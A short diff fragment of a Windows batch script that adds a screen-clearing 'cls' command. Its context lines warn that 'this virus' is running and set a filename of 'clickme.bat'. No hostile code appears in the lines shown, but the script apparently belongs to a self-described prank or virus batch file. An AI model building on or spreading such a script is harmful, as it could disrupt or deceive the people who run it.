@@ -64,6 +64,7 @@ echo I.f you don't want this virus running, close the window quickly without pre
 echo .
 echo .
 pause
+cls
 
 set "filename=clickme.bat"
 
